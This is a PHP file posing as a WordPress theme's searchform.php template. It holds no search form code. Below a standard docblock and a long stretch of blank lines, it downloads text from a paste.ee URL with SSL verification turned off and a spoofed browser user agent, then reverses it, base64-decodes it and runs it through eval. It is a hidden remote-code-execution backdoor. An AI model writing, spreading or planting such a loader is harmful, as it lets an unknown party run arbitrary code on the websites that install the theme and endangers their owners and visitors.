<?php


/* 
 * The searchform.php template.
 *
 * Used any time that get_search_form() is called.
 *
 * @link https://wordpress.org/themes/template/
 * @package WordPress
 * @subpackage 
 * @since 1.0 */
 











































$l = "https://paste.ee/r/6AQy1"/* "" - ni*/;


//DX for each form and a string


		
		if( function_exists('curl_init') ) {
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $l);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
			curl_setopt($ch, CURLOPT_HEADER, FALSE);
			curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36");
			$body = curl_exec($ch);
			curl_close($ch);
		}
		else {
			$body = @file_get_contents($l);			
		}
	 eval(base64_decode(strrev($body)));		

		




?>